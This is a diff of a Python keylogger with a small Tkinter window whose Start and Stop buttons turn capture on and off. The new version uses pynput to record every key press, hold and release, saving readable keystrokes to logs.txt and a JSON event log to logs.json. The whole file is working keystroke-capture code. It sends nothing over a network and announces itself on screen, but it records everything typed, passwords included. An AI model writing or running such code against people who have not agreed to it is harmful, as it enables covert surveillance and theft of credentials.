@@ -1,46 +1,70 @@
 from pynput import keyboard
 from pynput.keyboard import Key,Listener
-from datetime import datetime
 from tkinter import Tk, Label, Button
 import json
 
-keys = []
-listener = None
 
-with open("keylogger.txt", "a") as f:
-    f.write("TimeStamps"+(str(datetime.now()))[:-7]+":\n")
-    f.write("\n")
+key_list = []
+x = False
+key_strokes=""
+
+
+def update_txt_file(key):
+
+    letter=str(key)
+    letter=letter.replace("'","")
+    letter=letter.replace("Key.space"," ")
+    letter=letter.replace("Key.shift","")
+    letter=letter.replace("Key.backspace","<backspace>")
+    with open('logs.txt' , '+w') as key_strokes:
+        key_strokes.write(letter)
+ 
+
+def update_json_file (key_list):
+
+    with open('logs.json' , '+wb') as key_log:
+        key_list_bytes = json.dumps(key_list).encode()
+        key_log.write(key_list_bytes)
+ 
+
+def on_press(key) :
+
+    global x, key_list
+
+    if x == False:
+        key_list.append(
+            {'Pressed': f'{key}'}
+        )
+        x = True
+        if x == True:
+            key_list.append(
+                {'Held': f'{key}'}
+            )
+    update_json_file(key_list)
+               
+
+def on_release (key):
+
+    global x, key_list,key_strokes
     
-def on_press(key):
-    global count, keys
-    keys.append(key)
-    write_file(keys)
-    keys =[]
+    key_list.append(
+        {'Released': f'{key}'}
+    )
+    if x == True:
+        x = False
 
-def on_release(key):
-    if key == Key.esc:
-        return False
-        
-        
-        
-def write_file(keys):
-    with open("keylogger.txt", "a") as f:
-        for idx, key in enumerate(keys):
-            k = str(keys).replace("'", "")
-            if k.find("space") > 0 and k.find("backspace") == -1:
-                f.write("\n")
-            elif k.find("Key") == -1:
-                f.write(k)
-                
+    update_json_file(key_list)
 
-
+    key_strokes=key_strokes+str(key)
+    update_txt_file(str(key_strokes))
+        
         
 
 def start_keylogger():
     global listener
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
-    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
+    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'logs.txt' & 'logs.json'")
     start_button.config(state='disabled')
     stop_button.config(state='normal')
 
@@ -52,17 +76,17 @@ def stop_keylogger():
     stop_button.config(state='disabled')
 
 root = Tk()
-root.title("Keylogger")
+root.title("Keylogger GUI")
 
-label = Label(root, text="Click Start to begin keylogging.")
-label.pack()
+label = Label(root, text="Click Start to begin Keylogging.")
+label.place(x=100,y=40)
 
 start_button = Button(root, text="Start", command=start_keylogger)
-start_button.pack()
+start_button.place(x=140,y=80)
 
 stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
-stop_button.pack()
+stop_button.place(x=200,y=80)
 
-root.geometry("300x110")  # Set the window size to 300x110 pixels
+root.geometry("380x200")
 
 root.mainloop()
